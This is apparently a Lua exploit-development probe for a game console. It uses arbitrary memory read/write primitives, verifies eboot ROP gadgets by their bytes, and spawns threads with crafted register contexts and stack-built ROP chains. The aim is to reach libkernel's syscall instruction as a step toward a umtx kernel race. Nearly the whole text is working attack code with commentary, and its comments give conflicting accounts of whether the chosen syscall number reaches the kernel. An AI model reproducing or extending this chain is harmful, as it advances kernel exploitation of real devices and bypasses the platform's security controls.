-- CRASH_CLASS: HIGH (a child thread executes a stack-built ROP chain)
-- PROBE 158c: does the wrapper tail run the syscall number the thread asks for?
--
-- 157a proved a thr_create(430) child can run libkernel's syscall wrapper in a
-- loop, but that wrapper has `mov rax, 116` in front of it, so the thread can
-- only ever call gettimeofday. The interesting syscalls (454 umtx, 560 kevent,
-- 97 socket) need their own number in RAX.
--
-- eboot has no `syscall` instruction (157a scanned 1 MB for 0F 05 C3), but
-- libkernel does, inside the same wrapper: `mov rax, 116; mov r10, rcx;
-- syscall; ret`. The `syscall; ret` tail can be entered directly.
--
-- libkernel .text cannot be read to find that tail, so the wrapper is entered
-- at syscall.syscall_address (past the `mov rax, 116`) with RAX supplied by the
-- thread context:
--
--   RIP = syscall_address   (mov r10, rcx; syscall; ret)
--   RAX = 20 (getpid), RDI = marker page, RSP -> [mov [rdi], rax; ret][jmp $]
--
-- A non-zero marker equal to the process pid proves three things at once: the
-- child executes, an arbitrary syscall number reaches the kernel, and the
-- return value comes back to us.
--
-- This is the step that turns 157a's curiosity into the tool the umtx race
-- needs: swap 20 for 454 and the marker page for a umtx word, and the thread is
-- inside a blocking syscall while the main thread acts.

print("=== PROBE 158c: WHICH SYSCALL NUMBER DOES THE THREAD ACTUALLY RUN? ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078

---------------------------------------------------------------------------
-- [0] identity, eboot base, and the libkernel wrapper
---------------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; the loader did not expose the wrapper")
    return
end
local sw_hi, sw_lo = get_hi_lo(SW)
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo - 7))
print("[0] syscall_address=" .. q(SW) .. " wrapper=" .. q(wrapper))

-- libkernel .text is execute-only: reading even one byte of it kills the
-- process (this probe's first run died at the line below before it could print
-- a byte). So the wrapper is used, not inspected: syscall.syscall_address
-- already points past the `mov rax, 116`, at `mov r10, rcx; syscall; ret`, and
-- RAX comes from the thread context instead of from the wrapper.
local SysretKnown = false

---------------------------------------------------------------------------
-- [1] the two eboot gadgets, verified by byte before use
---------------------------------------------------------------------------
-- Known from 156d on this firmware; verified before use so a different build
-- cannot silently mis-execute.
local store = eboot_base + 0x92C67
local jmp_self = eboot_base + 0x15481
local function check4(a, b0, b1, b2, b3)
    return rb(a) == b0 and rb(a + 1) == b1 and rb(a + 2) == b2 and rb(a + 3) == b3
end
if not check4(store, 0x48, 0x89, 0x07, 0xC3) then
    print("[1] store gadget mismatch at " .. q(store) .. "; aborting")
    return
end
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[1] jmp $ mismatch at " .. q(jmp_self) .. "; aborting")
    return
end
print("[1] store=" .. q(store) .. " jmp $=" .. q(jmp_self))

---------------------------------------------------------------------------
-- [2] 158b says the tail ignores the context's RAX: a thread with RAX = 432
-- and RDI = buffer left the current time in the buffer (0x6AD79D2B, the same
-- seconds the gettimeofday thread saw), and 158a's RAX = 20 stored 0, which is
-- exactly gettimeofday's return value.
--
-- Two candidates remain:
--   1. `syscall_address` is not `mov r10, rcx` but a second `mov rax, 116`, so
--      every call through it is gettimeofday whatever the context says.
--   2. The context's RAX never reaches the thread, and 158a's 0x1234 came from
--      somewhere else.
--
-- E: RAX = 0x1234, RIP = store gadget -> marker must read 0x1234 (control)
-- F: RAX = 20, RIP = wrapper tail, RDI = zeroed buffer
--    -> a timeval in the buffer proves the tail ran gettimeofday despite RAX
---------------------------------------------------------------------------
local function new_page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do
        wq(p + off, uint64(0))
    end
    return p
end

local function new_stack(words)
    local st = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for k = 0, #words - 1 do
        wq(st + k * 8, words[k + 1])
    end
    return st
end

local function spawn(rip, rax, rdi, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, rip)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local marker = new_page(0x38)
local buf = new_page(0x38)

local tid_e, ok_e, rv_e = spawn(store, uint64(0x1234), marker, new_stack({ jmp_self }))
print("[2] E thr_create: ok=" .. tostring(ok_e) .. " rv=" .. tostring(to_num(rv_e)) .. " tid=" .. q(tid_e))

local tid_f, ok_f, rv_f = spawn(wrapper, uint64(20), buf, new_stack({ jmp_self }))
print("[2] F thr_create: ok=" .. tostring(ok_f) .. " rv=" .. tostring(to_num(rv_f)) .. " tid=" .. q(tid_f))

local ts = memory.alloc(16)
wq(ts, 0)
wq(ts + 8, 100000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local m = rq(marker)
local f0 = rq(buf)
local f1 = rq(buf + 8)
print("[2] E marker=" .. q(m) .. " (0x1234 means the context RAX is applied)")
print("[2] F buf: " .. q(f0) .. " " .. q(f1))

pcall(function() sc_thr_kill(tid_e, uint64(0)) end)
pcall(function() sc_thr_kill(tid_f, uint64(0)) end)

local ok3, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("[2] canary after: ok=" .. tostring(ok3) .. " pid=" .. tostring(pid1))

if to_num(m) == 0x1234 then
    print("[2] *** CONTEXT RAX IS APPLIED (control) ***")
else
    print("[2] control failed: marker=" .. string.format("0x%X", to_num(m)))
end
if to_num(f0) > 1000000000 then
    print("[2] *** THE TAIL IGNORED RAX = 20 AND RAN gettimeofday (116) ***")
elseif to_num(f0) == 0 and to_num(f1) == 0 then
    print("[2] F left the buffer zero: the tail did not run gettimeofday")
else
    print("[2] F wrote " .. q(f0) .. " " .. q(f1))
end

print("")
print("=== PROBE 158c DONE ===")
